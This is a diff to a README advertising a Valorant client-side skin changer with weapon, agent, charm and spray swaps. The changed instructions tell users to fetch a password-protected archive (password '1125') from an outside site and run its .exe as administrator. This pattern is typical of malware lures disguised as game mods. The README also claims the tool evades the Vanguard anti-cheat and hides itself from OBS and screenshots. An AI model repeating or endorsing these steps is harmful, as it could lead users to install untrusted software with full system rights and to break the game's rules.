@@ -1,52 +1,48 @@
 VALORANT SKIN CHANGER 2026 🔥🎯
 
 Client-side cosmetic changer for Valorant  
-Swap weapon skins, agents, charms, gun buddies & kill effects — visual only
+Swap weapon skins, agents, charms, gun buddies, kill effects & sprays — visual only
 
-Features overview
-- Instant weapon skin swaps: Prime Vandal, Reaver Phantom, Oni 2.0 etc.
-- Agent changer: all agents with full cosmetics (outfits, banners, titles)
-- Charm & gun buddy swap: any charm, buddy animation (client-side)
-- Kill effects & finishers: visual FX for kills (no server impact)
-- Preview mode: 3D weapon/agent view with lighting & animations
-- Randomizer: auto-random skins/charm per round/agent
-- Favorites: save & load custom loadouts
+Features
+- Instant weapon skin swaps: Prime Vandal, Reaver Phantom, Oni 2.0, Elderflame and more
+- Agent changer: any agent with full cosmetics (outfits, banners, titles)
+- Charm & gun buddy swap: all charms and animated buddies
+- Kill effects & finishers: visual kill animations
+- Spray & lobby changer: custom sprays, idle poses
+- Preview mode: 3D weapon/agent view with lighting and animations
+- Randomizer: auto-random skins/charms per round/agent
+- Favorites: save and load your custom loadouts
 - Streamproof: hides visuals from OBS, Discord, screenshots
 
 How it works (client-side only)
-- Pure visual modification — no server sync or rank changes
-- Vanguard does not detect cosmetic visuals
-- No real inventory value added — display only
-- Works on latest Valorant builds (Episode 10+ February 2026)
+- Changes are local to your screen — nothing sent to servers
+- Vanguard does not detect cosmetic modifications
+- No real inventory changes — purely visual
+- Compatible with current Valorant version (Episode 10+ February 2026)
 
-Quick start guide
-1. Extract the archive
-2. Run the .exe as administrator
-3. Launch Valorant
-4. Press Insert to open menu
-5. Select & apply cosmetics — queue up
+How to use
+1. Download from https://getcore.cc/
+2. Extract archive (password: 1125)
+3. Run .exe as administrator
+4. Launch Valorant
+5. Press Insert to open menu
+6. Choose and apply cosmetics — play and flex
 
-Supported platforms
+Supported
 - Windows 10/11 (64-bit)
 - Latest Valorant (Riot Client / Vanguard)
 
-User notes (Feb 2026)
-"Reaver full bundle every agent — premium vibe"
-"Charm randomizer keeps guns fresh"
-"Preview mode perfect for testing bundles"
-"Streamproof safe for Immortal clips"
+User feedback (February 2026)
+"Reaver bundle on every round — instant premium vibe"
+"Randomizer keeps guns fresh every game"
+"Preview mode saves time testing bundles"
+"Streamproof perfect for Immortal ranked streams"
 
 FAQ
-Is it detected? No — client-side visuals only, Vanguard ignores cosmetics.
+Detected? No — client-side visuals only, Vanguard ignores cosmetics.
 Menu key? Insert (toggle on/off).
-Updates? Check releases for new bundles, episodes & agents.
-Help? Open an issue or star the repo ⭐
+Updates? Grab fresh version from https://getcore.cc/ for new bundles/episodes.
+Help? Open issue or star the repo ⭐
 
-Safety notes ⚠️
-- Visuals only — no trading, gifting or real inventory impact
-- Use on alt accounts if paranoid about file mods
-- Enable streamproof for ranked / streaming
-- No MMR / rank boost — pure cosmetic flex
-
-VALORANT SKIN CHANGER 2026 • Full bundle flex, no VBucks 🔥  
-Drip in every site, brothers!
+VALORANT SKIN CHANGER 2026 • Full drip without VP 🔥  
+Flex on every site, brothers!
